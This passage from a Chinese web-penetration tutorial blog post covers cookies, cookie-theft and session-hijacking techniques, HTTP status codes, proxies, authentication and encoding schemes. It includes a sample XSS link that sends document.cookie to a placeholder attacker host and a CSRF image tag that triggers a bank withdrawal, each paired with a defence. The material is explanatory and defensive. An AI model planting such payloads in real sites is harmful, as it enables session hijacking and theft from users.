;</p><p>console. log (document. cookie);<br>禁止javascnipt操作cookie (为避免跨域脚本(xss)攻击，通过javascipt的document.cookie无法访问常有Httponly标记的cookie)<br>Set-Cookie：id-a3fWa; Expires=Wed, 21 0ct 2017 07:28:00 GMT; Secure；HttpOnly</p>        <h1 id="第三方cookie">          <a href="#第三方cookie" class="heading-link"><i class="fas fa-link"></i></a>第三方cookie</h1>      <p>通常cookie的域和浏览器地址的域匹配，这被称为第一方 cookie.那么第三方cookie就是cookie的域和地址栏中的域不匹配，这种cookie通常被用在第三方广告网站。为了跟踪用户的浏览记录，并且根据收集的用户的浏览习惯，给用户推送相关的广告。</p><p>例如：</p><ol><li><p>用户访问服务器1的一个页面index.html,这个页面和第三方广告网站合作，这个页面还有一张<span class="exturl"><a class="exturl__link" href="http://www.advertisement.com域名下的一张广告图ad1.jpg,当请求这张ad1.jpg图片的时候,www.advertisement.com这个服务器会给用户设置cookie/">www.advertisement.com域名下的一张广告图ad1.jpg,当请求这张ad1.jpg图片的时候，www.advertisement.com这个服务器会给用户设置cookie</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>:</p><p>Set-Cookie: user= “wang”；like=”a”；domin=”advertisement.com”</p><p>记录用户的浏览记录，分配个user来表示用户的身份。</p></li><li><p>用户访问服务器2的一个index.html页面，这个页面也和同家广告商合作，这个页面也包含一张<span class="exturl"><a class="exturl__link" href="http://www.advertisement.com域名下的张广告图ad2.jpg,当请求这张ad2.jpg图片的时候,浏览器就会向www.advertisement.com发送cookie/">www.advertisement.com域名下的张广告图ad2.jpg,当请求这张ad2.jpg图片的时候，浏览器就会向www.advertisement.com发送cookie</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>Cookie：user=” wang”; like=”a”;</p><p> <span class="exturl"><a class="exturl__link" href="http://www.advertisement.com收到浏览器发送的cookie识别了用户的身份,同时又把这个页面用户的浏览数据设置cookie/">www.advertisement.com收到浏览器发送的cookie识别了用户的身份，同时又把这个页面用户的浏览数据设置cookie</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>Set -Cookie: buy= “b” ; domain= ”adverti sement.com”</p></li><li><p>很巧，用户访问服务器3的一个index.html页面，这个页面也和那家广告商合作，这个页面也包含一张<span class="exturl"><a class="exturl__link" href="http://www.advertisement.com域名下的张广告图ad3.jpg,当请求这张ad3.jpg图片的时候,浏览器就会向www.advertisement.com发送cookie/">www.advertisement.com域名下的张广告图ad3.jpg,当请求这张ad3.jpg图片的时候，浏览器就会向www.advertisement.com发送cookie</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>Cookie: user=”wang”; like=”a”; buy=”b”</p><p>这样广告公司就可以根据用户的浏览习惯，给用户推送合适的广告。</p></li></ol>        <h1 id="安全">          <a href="#安全" class="heading-link"><i class="fas fa-link"></i></a>安全</h1>      <p>多数网站使用cookie作为用户会话的唯一标识， 因为其他的方法具有限制和漏洞。如果一 个网站使用cookies作为会<br>话标识符，攻击者可以通过窃取一套用户的cookies来冒充用户的请求。从服务器的角度，它是没法分辨用户和攻击者<br>的，因为用户和攻击者拥有相同的身份验证，下面介绍几种cookie盗用和会话劫持的例子：</p>        <h3 id="1-网络窃听">          <a href="#1-网络窃听" class="heading-link"><i class="fas fa-link"></i></a>1.网络窃听</h3>      <p>网络上的流量可以被网络上任何计算机拦截，特别是未加密的开放式WIFI.这种流量包含在普通的未加密的HTTP请求上发送Cookie.在未加密的情况下，攻击者可以读取网络上的其他用户的信息，包含HTTP Cookie的全部内容，以便进行中间的攻击。比如：拦截cookie来冒充用户身份执行恶意任务(银行转账等)。<br>解决办法：服务器可以设置secure属性的cookie,这样就只能通过https的方式来发送cookies 了。</p>        <h3 id="2-DNS缓存中毒">          <a href="#2-DNS缓存中毒" class="heading-link"><i class="fas fa-link"></i></a>2.DNS缓存中毒</h3>      <p>如果攻击者可以使DNS缓存中毒，那么攻击者就可以访问用户的Cookie了，例如:攻击者使用DNS中毒来创建个<br>虚拟的NDS服务h123456.<span class="exturl"><a class="exturl__link" href="http://www.demo.com指向攻击者服务器的ip地址.然后攻击者可以从服务器h123456.www.demo.com/img01.png%E5%8F%91%E5%B8%83%E5%9B%BE%E7%89%87%E3%80%82%E7%94%A8%E6%88%B7%E8%AE%BF%E9%97%AE%E8%BF%99%E4%B8%AA%E5%9B%BE%E7%89%87%EF%BC%8C%E7%94%B1%E4%BA%8Ewww.demo.com%E5%92%8Ch123456.www.demo.com%E5%90%8C%E4%B8%80%E4%B8%AA%E5%AD%90%E5%9F%9F%EF%BC%8C%E6%89%80%E4%BB%A5%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BC%9A%E6%8A%8A%E7%94%A8%E6%88%B7%E7%9A%84%E4%B8%8Ewww.demo.com%E7%9B%B8%E5%85%B3%E7%9A%84cookie%E9%83%BD%E4%BC%9A%E5%8F%91%E9%80%81%E5%88%B0h123456.www.demo.com%E8%BF%99%E4%B8%AA%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%EF%BC%8C%E8%BF%99%E6%A0%B7%E6%94%BB%E5%87%BB%E8%80%85%E5%B0%B1%E4%BC%9A%E6%8B%BF%E5%88%B0%E7%94%A8%E6%88%B7%E7%9A%84cookie%E6%90%9E%E4%BA%8B%E6%83%85%E3%80%82">www.demo.com指向攻击者服务器的ip地址。然后攻击者可以从服务器h123456.www.demo.com/img01.png发布图片。用户访问这个图片，由于www.demo.com和h123456.www.demo.com同一个子域，所以浏览器会把用户的与www.demo.com相关的cookie都会发送到h123456.www.demo.com这个服务器上，这样攻击者就会拿到用户的cookie搞事情。</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>一般情况下是不会 发生这种情况，通常是网络供应商错误。</p>        <h3 id="3-跨站点脚本XSS">          <a href="#3-跨站点脚本XSS" class="heading-link"><i class="fas fa-link"></i></a>3.跨站点脚本XSS</h3>      <p>使用跨站点脚本技术可以窃取cookie.当网站允许使用javascript操作cookie的时候，就会发生攻击者发布恶意代<br>码攻击用户的会话，同时可以拿到用户的cookie信息。</p><p>例如：</p><p>&lt;a href= “#”onclick= window. location=<span class="exturl"><a class="exturl__link" href="http://abc/">http://abc</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>. com?cookie=$｛docuemnt. cookie｝&gt;领取红包<a></a></p><p>当用户点击这个链接的时候，浏览器就会执行ondlick里面的代码，结果这个网站用户的cookie信息就会被发送到攻击者的服务器。攻击者同样可以拿cookie搞事情。</p><p>解决办法:可以通过cookie的HttpOnly属性，设置了HttpOnly属性, javascipt代码将不能操作cookie。</p>        <h3 id="4-跨站请求伪造CSRF">          <a href="#4-跨站请求伪造CSRF" class="heading-link"><i class="fas fa-link"></i></a>4.跨站请求伪造CSRF</h3>      <p>例如，SanShao可能正在浏览其他用户XiaoMing发布消息的聊天论坛。假设XiaoMing制作了一个引用ShanShao<br>银行网站的HTML图像元素，例如：</p><p>&lt;img src =”<span class="exturl"><a class="exturl__link" href="http://www/">http://www</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>. bank. com/withdraw?user-SanShao&amp;amount99999&amp;for=XiaoMing”&gt;</p><p>如果SanShao的银行将其认证信息保存在cookie中，并且cookie尚未过期，(当然是没有其他验证身份的东西)，那么SanShao的浏览器尝试加就该图片将史用他的cookie提交提款表单，从而在未经SanShao批准的情况下授权交易。</p><p>解决办法：增加其他信息的校验(手机验证码，或者其他盾牌)</p>        <h1 id="状态码">          <a href="#状态码" class="heading-link"><i class="fas fa-link"></i></a>状态码</h1>      <p>每条HTTP响应消息都必须在第一行中包含一个状态码，说明请求的结果。根据代码的第一位数字，可将状态码分为以下5类。<br>1xx: 提供信息。<br>2xx: 请求被成功提交。<br>3xx: 客户端被重定向到其他资源。<br>4xx: 请求包含某种错误。<br>5xx: 服务器执行请求时遇到错误。</p><p>还有大量特殊状态码，其中许多状态码仅用在特殊情况下。下面列出渗透测试员在攻击Web应用程序时最有可能遇到的状态码及其相关的原因短语。<br>100 Continue。当客户端提交一个包含主体的请求时，将发送这个响应。该响应表示已收到请求消息头，客户端应继续发送主体。请求完成后，再由服务器返回另一个响应。<br>200 0K：本状态码表示已成功提交请求，且响应主体中包含请求结果。<br>201 Created，PUT 请求的响应返回这个状态码，表示请求已成功提交。<br>301 Moved Permanently：本状态码将浏览器永久重定向到另外一个在Location消息头中指定的URL，以后客户端应使用新URL替换原始URL.。<br>302 Found: 本状态码将浏览器暂时重定向到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL。<br>304 Not Modified: 本状态码指示浏览器使用缓存中保存的所请求资源的副本。服务器使用If-Modified-Since与If-None-Match消息头确定客户端是否拥有最新版本的资源。<br>400 Bad Request: 本状态码表示客户端提交了一个无效的HTTP请求。当以某种无效的方式修改请求时(例如在 URL中插入一个空格符)，可能会遇到这个状态码。<br>401 Unauthorized: 服务器在许可请求前要求HTTP进行身份验证。WWW -Authenticate消息头详细说明所支持的身份验证类型。<br>403 Forbidden: 本状态码指出，不管是否通过身份验证，禁止任何人访问被请求的资源。404 Not Found: 本状态码表示所请求的资源并不存在。<br>405 Method Not Allomed: 本状态码表示指定的URL不支持请求中使用的方法。例如，如果试图在不支持PUT方法的地方使用该方法，就会收到本状态码。。<br>413 Request Entity Too Large: 如果在本地代码中探查缓冲器滋出瀚洞并就此提交超长数据串，则本状态码表示请求主体过长，服务器无法处理。。<br>414 Request URL Too Long: 与前一个响应类似，本状态码表示请求中的URL过长，服务器无法处理。<br>500 Internal Server Error: 本状态码表示服务器在执行请求时遇到错误。当提交无法预料的<br>输入、在应用程序处理过程中造成无法处理的错误时，通常会收到本状态码。应该仔细检查服务器响应的所有内容，了解与错误性质有关的详情。<br>503 Service Unavailable: 通常，本状态码表示尽管Web服务器运转正常并且能够响应请求，但服务器访问的应用程序还是无法作出响应。应该进行核实，是否因为执行了某种行为而造成这个结果。</p>        <h1 id="HTTP代理">          <a href="#HTTP代理" class="heading-link"><i class="fas fa-link"></i></a>HTTP代理</h1>      <p>HTTP代理服务器是一个协调客户端浏览器 与目标Web服务器之间访问的服务器。当配置浏览器使用代理服务器时，它会将所有请求提交到代理服务器，代理服务器再将请求转送给相关Web服务器，并将响应返回给浏览器。大多数代理还使用其他服务，如缓存、验证与访问控制。</p><p>值得注意的是，如果使用代理服务器，HTTP 的工作机制会出现两方面的差异。</p><p>当浏览器向代理服务器发布HTTP请求时，它会将完整的URL(包括协议前缀http://与 服务器主机名称，在非标准URL中，还包括端口号)插人请求中。代理服务器将提取主机名称和端口，并使用这些信息将请求指向正确的目标Web服务器。<br>当使用HTTPS时浏览器无法与代理服务器进行SSL 握手因为这样做会破坏安全隧道，使通信易于遭受拦截攻击。因此，浏览器必须将代理作为一个纯悴的TCP级中继，由它传递浏览器与目标Web浏览器之间的所有网络据，并与浏览器进行正常的SSL握手。浏览器使用CONNECT方法向代理服务器提交一个 HTTP请求，并指定URL中的目标主机名称与端口号，从而建立这种中继。如果代理允许该请求，它会返回一个含200状态码的HTTP响应，一直开放TCP连接，从此以后作为目标Web服务器的纯粹TCP级中继。</p><p>从某种程度上说，攻击Web应用程序时最有用的工具是一个处在浏览器与目标Web站点之间的专用代理服务器，使用它可以拦截并修改所有使用HTTPS的请求与响应。</p>        <h1 id="HTTP身份验证">          <a href="#HTTP身份验证" class="heading-link"><i class="fas fa-link"></i></a>HTTP身份验证</h1>      <p>HTTP拥有自己的用户身份验证机制，使用不同的身份验证方案。</p><p>Basic 这是种非常商单的身份验证机制。它在请求清息头中随每条消息以Base64编码字符串的形式发送用户证书。</p><p>NTLM WindowsNT 挑战/响应验证机制,称之为NTLM。现在已经有了更新的NTLMv2以及Kerberos 验证体系。NTLM是windows早期安全协议，因向后兼容性而保留下来。</p><p>Digest 这是一种响应式机制，它随同用户证书一起使用一个随机值MD5校验和。</p><p>虽然组织内部经常使用这些身份验证协议访问内联网服务，但因特网上的Web应用程序基本很少使用它们。</p>        <h1 id="编码方案">          <a href="#编码方案" class="heading-link"><i class="fas fa-link"></i></a>编码方案</h1>      <p>Web应用程序对其数据采用几种不同的编码方案。在早期阶段，HTTP 协议和HTML语言都是基于文本的，于是人们设计出不同的编码方案，确保这些机制能够安全处理不常见的字符和二进制数据。攻击Web应用程序通常需要使用相关方案对数据进行编码，确保应用程序按照想要的方式对其进行处理。而且，在许多情况下，攻击者甚至能够控制应用程序所使用的编码方案，造成其设计人员无法预料的行为。</p>        <h3 id="1-URL编码">          <a href="#1-URL编码" class="heading-link"><i class="fas fa-link"></i></a>1.URL编码</h3>      <p>URL只允许使用US-ASCII字符集中的可打印字符(也就是ASCII代码在0x20一0x7e范围内的字符)。而且，由于URL方案或HTTP协议内具有特殊含义,这个范围内的一些字符也不能用在URL中。</p><p>URL编码方案主要用于对扩展ASCII字符集中的任何有问题的字符进行编码，使其可通过HTTP 安全传输。任何URL编码的字符都以%为前缀，其后是这个字符的两位十六进制ASCII代码。以下是一些常见的URL编码字符:</p><p>%3d：代表=;<br>%25：代表%;<br>%20：代表空格；</p><p>%0a：代表换行;<br>%00：代表空字节。<br>另一个值得注意的编码字符是加号(+).它代表URL编码的空格(除%20。代表空格外))</p>        <h3 id="2-Unicode编码">          <a href="#2-Unicode编码" class="heading-link"><i class="fas fa-link"></i></a>2.Unicode编码</h3>      <p>Unicode是一种为支持全世界所使用的各种编写系统而设计的字符编码标准，它采用各种编码方案.其中一些可用于表示Web应用程序中的不常见字符。</p><p>16位Unicode编码的工作原理与URL编码类似。为通过HTTP进行传输，16位Unicode编码的字符以u为前缀，其后是这个字符的十六进制Unicode码点。例如:<br>%u2215：代表 / ；<br>%u00e9：代表；</p><p>UTF-8是一种长度可变的编码标准。它使用一个或几个字节表示每个字符。为通过HTTP进行传输，UTF-8编码的多字节字符以毛为前缀，其后用十六进制表示每个字节。例如:<br>%c2%a9：代表（一个圆圈里面有c）；<br>%e2%89%a0：代表（不等于号）；</p><p>攻击Web应用程序时之所以要用到Unicode编码，主要在于有时可用它来破坏输入确认机制。如果输入过滤阻止了某些恶意表达式，但随后处理输入的组件识别Unicode编码，就可以使用各种标准与畸形Unicode编码避开过滤。</p>        <h3 id="3-HTML编码">          <a href="#3-HTML编码" class="heading-link"><i class="fas fa-link"></i></a>3.HTML编码</h3>      <p>HTML编码是一种用于表示问题字符以将其安全并入HTML文档的方案。有许多字符具有特殊的含义(如HTML内的元字符)，并被用于定义文档结构而非其内容。为了安全使用这些字符并将其用在文档内容中，就必须对其进行HTML编码。</p><p>HTML编码定义了大量HTML实体来表示特殊的字面量字符.例如:<br>&amp;quot：代表 ”；<br>&amp;apos：代表 ’；<br>&amp;amp：代表 &amp; ；<br>&amp;lt：代表 &lt; ；<br>&amp;g:：代表 &gt; ；</p><p>此外，任何字符都可以使用它的十进制ASCII码进行HTML编码，例如:<br>&amp;#34：代表 ” ；<br>#39：代表 ’ ；</p><p>或者使用十六进制的ASCII码(以x为前缀)，例如:<br>&amp;#x22：代表 ”；<br>&amp;#x27：代表 ’ ；</p><p>当攻击Weh应用程序时，HTML编码主要在探查跨站脚本漏洞时发挥作用。如果应用程序在响应中返回未被修改的用户输入，那么它可能易于受到攻击。但是，如果它对危险字符进行HTML编码，也许比较安全。</p>        <h3 id="4-Base64编码">          <a href="#4-Base64编码" class="heading-link"><i class="fas fa-link"></i></a>4.Base64编码</h3>      <p>Base64编码仅用个可打印的 ASCII字符就可安全转换任何二进制数据，它常用于对电子邮件附件进行编码，使其通过SMTP安全传输。它还可用于在基本HTTP验证机制中对用户证书进行编码。</p><p>Base64编码将输入数据转换成3个字节块。每个块被划分为4段，每段6个数据位。这6个数据位有64种不同的排列组合，因此每个段可使用一组64个字符表示。Base64编码使用以下字符集，其中只包含可打印的ASCII字符:<br>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopgrstuvwxyz0123456789-/。</p><p>如果最后的输入数据块不能构成3段输出数据，就用一个或两个等号(=)补足输出。<br>例如，The Web Application Hacker’ s Hand book 的Base64编码为:<br>VGh1IFd1YiBBcHBsaWNhdG1vbiBIYWNrZXIncyBIYW5kYm9vaw==</p><p>许多Web应用程序利用Base64编码在cookie与其他参数中传送二进制数据，甚至用它打乱敏感数据以防止即使是细微的修改。应该总是留意并解码发送到客户端的任何Base64数据。由于这些数据使用特殊的字符集，而且有时会在字符串末尾添加补足字符(=)，因此可以轻易辨别出Base64编码的字符串。</p>        <h3 id="5-十六进制编码">          <a href="#5-十六进制编码" class="heading-link"><i class="fas fa-link"></i></a>5.十六进制编码</h3>      <p>许多应用程序在传送二进制数据时直接使用十六进制编码，用ASCII字符表示十六进制数据块。例如，对cookie中的用户名daf进行十六进制编码，会得到以下结果：<br>646166</p><p>和Base64编码的数据一样，十六进制编码的数据通常也很容易辨认。为了解十六进制编码的功能应当对服务器发送到客户端的任何十六进制数据进行解码。</p>        <h3 id="6-远程和序列化框架">          <a href="#6-远程和序列化框架" class="heading-link"><i class="fas fa-link"></i></a>6.远程和序列化框架</h3>      <p>近些年出现了各种用于创建用户界面的框架，这些框架中的客户端代码可以远程访问服务器端实施的编程API，利用这些框架，开发者可以在一定程度上忽略Web应用程序的分布式本质，而以与开发传统桌面应用程序类似的方式编写代码。这些框架通常提供客户端上使用的存根API，它们还能够自动处理以下两个任务：通过这些API远程调用相关服务器端功能，对传送给上述功能的任何数据进行序列化。</p><p>这类远程和序列化框架包括:<br>Flex和AMF:<br>Silverlight 和WCF;<br>Java序列化对象<br>ThinkPHP.<br>Struts2</p>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
